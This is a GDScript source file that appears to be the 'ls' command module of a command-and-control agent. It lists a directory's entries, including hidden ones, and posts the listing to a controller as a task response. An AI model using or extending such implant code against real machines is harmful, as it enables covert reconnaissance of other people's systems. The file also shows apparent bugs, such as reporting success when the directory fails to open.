extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_ls(task):
	
	if task.has("command") and task.get("command") == "ls":
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var path = parameters.get("path").replace("\\", "/") # windows supports forward slashes since XP, FFS folks - use it...
		var output = "Unable to obtain listing for: %s" % [path]
		var status = "error"
		var success = false
		var is_file = true
		var pathname = path
		var parent_path = ""

		var ret = []
		
		var dir = DirAccess.open(path)
		# TODO: ls w/o params should look at cwd?
		if dir:
			is_file = false
			success = true

			var full_path = dir.get_current_dir(true)

			parent_path = full_path.split("/")

			if full_path.ends_with("/"):
				# remove trailing slash
				if parent_path.size() > 1:
					parent_path.remove_at(parent_path.size()-1)
			
			if parent_path.size() > 1:
				# remove trailing path
				var idx = parent_path.size()
				pathname = parent_path[idx-1]
				parent_path.remove_at(idx-1)

			parent_path = "/".join(parent_path)
			
			if parent_path == "":
				parent_path = "/"

			if pathname == "":
				pathname = "/"

			dir.set_include_hidden(true)
			dir.set_include_navigational(true)
			dir.list_dir_begin()

			var file_name = dir.get_next()
			full_path = dir.get_current_dir(true)

			while file_name != "":
				var entry_path = "user://%s/%s" % [full_path, file_name]
				var entry = {
					"is_file": false,
					"permissions": {"read": true},
					"name": file_name,
					"access_time": 0,
					"modify_time": FileAccess.get_modified_time(entry_path),
					"size": 0,
				}
				
				if typeof(entry["modify_time"]) == TYPE_STRING:
					entry["modify_time"] = 0
				else:
					entry["modify_time"] = entry["modify_time"]*1000

				if dir.current_is_dir():
					var dir_access = DirAccess.open(entry_path)

					if not dir_access:
						entry["permissions"] = {"read": false}
				else:
					entry["is_file"] = true

					var file_access = FileAccess.open(entry_path, FileAccess.READ)

					if file_access == null:
						entry["permissions"] = {"read": false}
					else:
						entry["size"] = file_access.get_length()
						file_access.close()

				ret.append(entry)
				file_name = dir.get_next()

			dir.list_dir_end()
			output = "Listing for: %s" % [path]

		status = "success"

		var ls_response = {
			"task_id": task.get("id"),
			"user_output": output,
			"status": status,
			"completed": true,
			"file_browser": {
				"is_file": is_file,
				"name": pathname.simplify_path(),
				"parent_path": parent_path.simplify_path(),
				"update_deleted": true,
				"success": success,
				"files": ret
			}
		}

		print("\n\n")
		print(ls_response)
		print("\n\n")

		api.send_agent_response(
			JSON.stringify({
				"action": "post_response",
				"responses": [ls_response],
			})
		)
